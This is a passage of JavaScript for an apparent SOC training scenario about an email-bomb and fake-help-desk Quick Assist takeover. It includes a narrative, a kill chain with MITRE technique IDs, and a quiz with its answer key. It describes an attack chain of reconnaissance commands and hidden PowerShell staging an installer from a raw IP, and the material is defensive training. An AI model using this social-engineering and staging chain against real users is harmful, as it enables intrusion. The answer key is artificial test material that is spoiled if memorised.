        { value: "isolate_reset_hunt", label: "Isolate WKS-NW-118 to cut the live session, reset j.mercer and revoke her tokens, find and quarantine the staged installer, hunt the host for what ran during the session, and verify the caller out-of-band while tightening remote-support policy" },
        { value: "block_ip_only", label: "Block 185.220.101.44 at the firewall — with the staging host unreachable, the operator's access is cut and the case can be closed" },
        { value: "purge_mail", label: "Purge the newsletter emails and quarantine their senders, since removing the flood that started it all resolves the incident" },
        { value: "disable_qa", label: "Disable Quick Assist across the fleet by GPO; because the session used that tool, removing the tool everywhere ends the incident on its own" },
      ],
      answer: "isolate_reset_hunt",
      xp: 65,
      explanation:
        "Containment has to address the live channel, the account, the staged file and the way in — not just one artefact. Isolating the host severs the operator's hands-on session immediately; resetting j.mercer and revoking her tokens closes the identity the operator acted through; locating and quarantining the staged installer prevents the next step; and because access arrived through a fake Service Desk call, the caller must be verified out-of-band and the remote-support workflow tightened. (b) blocks one address but leaves the running session and the staged file untouched. (c) treats the flood as the incident — it was only the bait, and purging it does nothing about the remote session. (d) blocks the tool everywhere yet ignores the live session, the account and the staged installer already on this host.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Email Bomb to Fake Help Desk — Quick Assist Takeover",
    threat_actor: "Social-engineering intrusion operator (mail-flood pretext, help-desk impersonation)",
    attack_kind: "email_bomb_social_eng",
    briefing:
      "CrowdStrike raised a High detection on WKS-NW-118: minutes after the user's mailbox took a torrent of newsletter sign-up messages, a built-in Windows remote-support tool started and began firing off enumeration commands. The Service Desk log shows she was reached out of the blue and offered help. Decide whether this is real support or a break-in, how the operator reached the keyboard, and what to contain.",
    narrative: `The day before, an ordinary remote-support session ran on WKS-NW-072: the built-in Quick Assist tool, started against ticket INC0210044 — a ticket the machine's own user had opened through the portal — and driven by a known internal technician, r.kline. No mailbox flood preceded it and no one had cold-called the user. That is what sanctioned Quick Assist support looks like, and it is the yardstick for everything that follows.

At 09:14 the mailbox of j.mercer, an accounts-payable clerk, began to fill. Over the next fourteen minutes Defender for Office 365 delivered 312 inbound subscription and newsletter confirmation emails from 297 distinct external senders — Substack, the New York Times, Notion, Wired, LinkedIn and hundreds more. Every one was a genuine double-opt-in message, scanned and delivered clean; none carried malware or a phishing verdict. That is the signature of an email bomb: not one malicious message, but an overwhelming volume of benign ones. j.mercer even created an inbox rule to sweep the "confirm" mail into a folder, which the Exchange audit log recorded.

Then came the turn. At 09:30 she raised ticket INC0210318 — "flooded with spam emails" — and the record captured more than the spam: shortly after the burst, a person had reached her over a Microsoft Teams call, said they were the IT Service Desk, and offered to stop the flood if she started Quick Assist and read out the six-digit code. No IT-initiated ticket existed for that outreach, and the caller was not in the staff directory. The flood, in other words, was never the attack; it was the pretext manufactured to make that call believable.

At 09:33 Quick Assist launched on WKS-NW-118. Falcon recorded quickassist.exe as fully signed and trusted (Microsoft Windows) — because it genuinely is Microsoft's own tool, not malware. Nothing about the binary is wrong; everything about the context is. There was no user-opened ticket for the session, and it began on the word of an unsolicited caller, minutes after an engineered mail flood (T1219). With the operator now on the keyboard, the session went to work: cmd.exe spawned systeminfo (T1082), then quser (T1033), then net localgroup administrators (T1069.001) — host, session and local-privilege reconnaissance a payments clerk's workstation has no reason to perform. At 09:41 a hidden PowerShell spawned by the session used Invoke-WebRequest to pull nw-support-agent.msi from a raw-IP host, 185.220.101.44, into C:\\Windows\\Temp (T1059.001) — staging follow-on tooling. Two minutes later Falcon correlated the unsolicited Quick Assist session and the discovery burst into a single High detection.

The case is deliberately uncomfortable for an analyst who trusts signatures and chases the loudest signal. The tool at the centre of it verifies perfectly, and the hundreds of alarming-looking emails are all clean. The verdict comes only from reading the whole chain in order — an engineered flood, an unsolicited caller, a remote session no one requested, and a domain-clueless clerk's host being enumerated — and against the sanctioned Quick Assist session that proves the same shape can be entirely legitimate when the provenance is accountable.`,
    learning_objectives: [
      "Recognise an email bomb — a short-window burst of individually-clean subscription and newsletter confirmations from many distinct senders to one mailbox — as a social-engineering setup, not a malware event",
      "Explain why a flood of individually-legitimate emails is the opening move and not the attack: it overwhelms the target and manufactures a pretext for a fake help-desk contact",
      "Trace the callback pivot: an unsolicited Teams/phone contact impersonating the Service Desk that talks a user into starting Quick Assist and sharing the code (T1566.004 into T1219)",
      "Judge a signed, built-in Microsoft remote-support tool by its context — no user-opened ticket, unsolicited contact, host enumeration afterward — rather than by its trusted signature",
      "Scope containment for a Quick Assist takeover: isolate the host and sever the session, reset the targeted user, hunt the staged tooling, and verify the caller out-of-band",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: "2026-08-24T15:20:00Z", phase: "Baseline", action: `Sanctioned Quick Assist session on ${benign.hostname} — user-opened ticket ${benignTicket}, internal technician ${benignTech}, no mail flood` },
      { ts: T(0), phase: "Resource Development", action: `Email bomb begins — a burst of benign subscription confirmations from hundreds of distinct senders floods ${victim.email} (setup, T1585/T1566)` },
      { ts: T(11 * MIN), phase: "Observation", action: `${victim.sam} creates an inbox rule to sweep the confirmation mail — the flood corroborated from the Exchange audit log` },
      { ts: T(16 * MIN), phase: "Initial Access", action: `Unsolicited Teams call posing as the Service Desk induces ${reportTicket}: start Quick Assist and share the code (T1566.004)` },
      { ts: T(19 * MIN), phase: "Command and Control", action: `${victim.sam} launches Quick Assist on ${victim.hostname} — signed and trusted, but no user-opened ticket (T1219)` },
      { ts: T(22 * MIN), phase: "Discovery", action: "systeminfo — host profiling under the remote session (T1082)" },
      { ts: T(23 * MIN), phase: "Discovery", action: "quser — logged-on session enumeration (T1033)" },
      { ts: T(24 * MIN), phase: "Discovery", action: "net localgroup administrators — local admin enumeration (T1069.001)" },
      { ts: T(27 * MIN), phase: "Execution", action: `Hidden PowerShell stages ${payloadName} from ${stagingIp} into C:\\Windows\\Temp (T1059.001)` },
      { ts: T(29 * MIN), phase: "Detection", action: "Falcon correlates the unsolicited Quick Assist session and the discovery burst into a High detection" },
    ],
    questions,
  };
}
